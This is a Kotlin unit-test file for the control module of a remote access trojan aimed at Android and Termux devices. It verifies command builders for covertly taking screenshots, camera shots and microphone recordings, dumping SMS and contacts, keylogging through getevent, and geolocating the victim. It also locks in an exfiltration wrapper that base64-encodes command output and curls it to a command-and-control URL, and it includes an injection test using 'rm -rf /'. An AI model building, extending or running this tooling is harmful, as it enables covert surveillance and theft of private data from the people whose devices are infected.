package com.projectzerodays.quantumcli.ops

import org.json.JSONObject
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test

/** Pure-helper tests — no C2 server, no agents. */
class RatControlTest {

    @Test
    fun catalogHasHonestRequiresOnEveryCapability() {
        assertTrue(RatControl.CAPABILITIES.size >= 10)
        RatControl.CAPABILITIES.forEach {
            assertTrue(it.title.isNotBlank())
            assertTrue(it.requires.isNotBlank())
            assertTrue(it.desc.isNotBlank())
        }
        assertEquals("termux-api", RatControl.describe("sms")!!.requires)
        assertEquals("root", RatControl.describe("keylog")!!.requires)
        assertEquals("stock", RatControl.describe("sysinfo")!!.requires)
        assertNull(RatControl.describe("nope"))
    }

    @Test
    fun buildersMatchPythonProtocol() {
        // byte-compat spot checks against quantum.rat.commands
        assertEquals(
            "uname -a 2>/dev/null; echo ---; id 2>/dev/null; echo ---; " +
                "uptime 2>/dev/null; echo ---; " +
                "getprop ro.product.model 2>/dev/null; getprop ro.build.version.release 2>/dev/null",
            RatControl.cmdSysinfo(),
        )
        assertTrue(RatControl.cmdLocate().contains("ip-api.com"))
        assertTrue(RatControl.cmdScreenshot().contains("screencap -p"))
        assertTrue(RatControl.cmdCamera(1).contains("-c 1"))
        assertTrue(RatControl.cmdMic(30).contains("-l 30"))
        assertTrue(RatControl.cmdSms().contains("termux-sms-list"))
        assertTrue(RatControl.cmdContacts().contains("termux-contact-list"))
        assertTrue(RatControl.cmdApplist().contains("pm list packages"))
        assertTrue(RatControl.cmdKeylogAndroid().contains("getevent"))
    }

    @Test
    fun `shell quoting neutralizes injection`() {
        val q = RatControl.shQuote("/sd card; rm -rf /")
        assertEquals("'/sd card; rm -rf /'", q)
        assertTrue(RatControl.cmdFileList("/sd card").startsWith("ls -la '/sd card'"))
    }

    @Test
    fun emptyShellRefused() {
        try {
            RatControl.cmdShellRaw("   ")
            throw AssertionError("expected refusal")
        } catch (e: IllegalArgumentException) {
            assertTrue(e.message!!.contains("empty"))
        }
        try {
            RatControl.wrapExfil(" ", "http://x:8443", "h")
            throw AssertionError("expected refusal")
        } catch (e: IllegalArgumentException) {
            assertTrue(e.message!!.contains("empty"))
        }
    }

    @Test
    fun wrapExfilParityWithPython() {
        // Byte-exact parity lock with quantum.rat.commands.wrap_exfil("id", …):
        // same input must produce the same 263-char shell text on both sides.
        // (Anchors avoid quote/backslash escapes in source; length seals it.)
        val sh = "${'$'}"
        val w = RatControl.wrapExfil("id", "http://10.0.0.1:8443/", "rat-host")
        assertEquals(263, w.length)
        assertTrue(w.startsWith("T=" + sh + "{TMPDIR:-/tmp}/.qo" + sh + sh + "; (id) >" + sh + "T"))
        assertTrue(w.contains("http://10.0.0.1:8443/r"))
        assertTrue(w.contains("rat-host"))
        assertTrue(w.contains("base64") && w.contains("curl"))
        assertTrue(w.endsWith("rm -f " + sh + "T"))
        // JSON field names ride escaped inside the shell double quotes
        assertTrue(w.contains("host") && w.contains("data"))
    }

    @Test
    fun buildTaskProducesTaskqObject() {
        val t = RatControl.buildTask("rat-host", "sysinfo", "", "http://10.0.0.1:8443")
        assertEquals("run", t.getString("act"))
        assertTrue(t.getString("cmd").contains("uname -a"))
        assertTrue(t.getString("cmd").contains("http://10.0.0.1:8443/r"))
        val shell = RatControl.buildTask("h", "shell", "id", "http://x:8443")
        assertTrue(shell.getString("cmd").contains("(id)"))
        try {
            RatControl.buildTask("h", "nope", "", "http://x:8443")
            throw AssertionError("expected refusal")
        } catch (e: IllegalArgumentException) {
            assertTrue(e.message!!.contains("unknown capability"))
        }
        try {
            RatControl.buildTask("  ", "sysinfo", "", "http://x:8443")
            throw AssertionError("expected refusal")
        } catch (e: IllegalArgumentException) {
            assertTrue(e.message!!.contains("host"))
        }
    }

    @Test
    fun parseLocateSummarizesOrReturnsNull() {
        val payload = JSONObject()
            .put("status", "success")
            .put("query", "1.2.3.4")
            .put("city", "Springfield")
            .put("regionName", "Illinois")
            .put("country", "United States")
            .put("isp", "Example ISP")
            .toString()
        val summary = RatControl.parseLocate(payload)
        assertTrue(summary!!.contains("Springfield"))
        assertTrue(summary.contains("1.2.3.4"))
        assertTrue(summary.contains("coarse"))
        assertNull(RatControl.parseLocate("""{"status":"fail"}"""))
        assertNull(RatControl.parseLocate("not json"))
    }

    @Test
    fun stalenessUsesSameThresholdAsPython() {
        val now = System.currentTimeMillis()
        val fresh = RatControl.formatTs(now - 60_000)
        val old = RatControl.formatTs(now - 600_000)
        assertFalse(RatControl.isStale(fresh, now))
        assertTrue(RatControl.isStale(old, now))
        assertTrue(RatControl.isStale(null, now))
        assertTrue(RatControl.isStale("garbage", now))
    }
}
